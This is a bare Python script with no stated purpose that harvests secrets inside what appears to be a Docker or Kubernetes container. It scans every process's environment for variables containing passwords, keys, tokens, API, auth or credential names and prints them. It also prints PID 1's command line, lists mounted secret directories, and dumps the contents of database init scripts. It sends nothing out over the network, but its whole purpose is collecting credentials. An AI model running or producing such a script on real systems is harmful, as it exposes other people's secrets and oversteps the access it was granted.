import os,subprocess,glob

secrets = set()
for p in glob.glob('/proc/[0-9]*/environ'):
    try:
        with open(p, 'rb') as f:
            data = f.read()
        for line in data.split(b'\x00'):
            line = line.decode('utf-8', errors='ignore')
            up = line.upper()
            if any(k in up for k in ['PASS','KEY','SECRET','TOKEN','REDIS','API_','AUTH','CRED','GRAFANA']):
                secrets.add(line.replace('\t','~'))
    except:
        pass

for s in sorted(secrets):
    print("ENV:"+s)

try:
    with open('/proc/1/cmdline','rb') as f:
        print("PID1:"+f.read().replace(b'\x00',b'|').decode())
except:
    print("PID1:UNREADABLE")

config_paths = ['/opt/postgresql/','/docker-entrypoint-initdb.d/','/run/secrets/','/var/run/secrets/']
for cp in config_paths:
    try:
        files = os.listdir(cp)
        if files:
            print("DIR:"+cp+":"+",".join(files[:20]))
    except:
        pass

for ip in glob.glob('/docker-entrypoint-initdb.d/*'):
    try:
        with open(ip) as f:
            c = f.read()[:300].replace('\n','|')
        print("INIT:"+ip+":"+c)
    except:
        pass
